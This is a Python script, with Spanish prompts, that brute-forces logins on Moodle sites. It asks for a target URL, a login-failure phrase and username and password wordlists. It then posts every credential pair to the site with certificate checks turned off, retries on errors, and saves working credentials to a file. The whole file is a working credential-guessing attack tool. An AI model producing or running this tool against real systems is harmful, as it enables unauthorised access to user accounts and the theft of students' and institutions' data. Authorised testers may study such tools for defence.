#import mechanize --> otra opció de realizar la sesión con el servidor
import sys
import time
import requests
import urllib3

urllib3.disable_warnings()

url = input("Introduce la url del moodle a escanear: ")
frase_error = input("Introduce la frase de error de inicio incorrecto: ")
ruta_dic_users = input("Ruta ubicación diccionario users: ")
ruta_dic_passw = input("Ruta ubicación diccionario passwords: ")

nombre = ("\x1b[1;33m" + "f" + "\x1b[1;35m" + "3" + "\x1b[1;32m" + "l" + "\x1b[1;34m" + "3" + "\x1b[1;30m" + "p"
          + "\x1b[1;36m" + "1" + "\x1b[1;31m"+ "n" + "\x1b[1;37m" + "0" + "\n")

z = """
       Conectando con el servidor...
   [+]-------------------------------[+]
          Script By: {}\n""".format(nombre)

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

def error():
    z = "[o] Hay un problema. Re-intentando la conexión... :(\n"

    for c in z:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.02)

def connect(line1, line2):
    credentials = {
        "username": line1[:-1],
        "password": line2[:-1]
    }

    req = requests.post(url, verify=False, data=credentials)

    return req

def browser(line1, line2):
    time.sleep(0.5)
    while True:
        try:
            ejemplo = connect(line1, line2)
            break
        except:
            error()

    return ejemplo

def main():
    bucle = True
    while bucle:
        with open(ruta_dic_users, 'r+', encoding="utf8") as file, \
                open(ruta_dic_passw, "r+", encoding="utf8") as file2, \
                open("./CredValidas.txt", 'w+', encoding="utf8") as valids:
            for line1 in file:
                for line2 in file2:
                    req = browser(line1, line2)
                    if req.text.find(frase_error) == -1:
                        print("\x1b[1;32m" + "[x] Credenciales válidas: usuario: {} - password: {}".format(line1[:-1],line2[:-1]))
                        valids.write("Usuario: {} Password: {}".format(line1[:-1],line2[:-1]) + "\n")
                        bucle = False
                        break
                    else:
                        print("\x1b[0;31m" + "[x] Buscando credenciales... {} - {} Inválidos".format(line1[:-1],line2[:-1]))
                file2.seek(0)
            file.seek(0)

if __name__ == "__main__":
    main()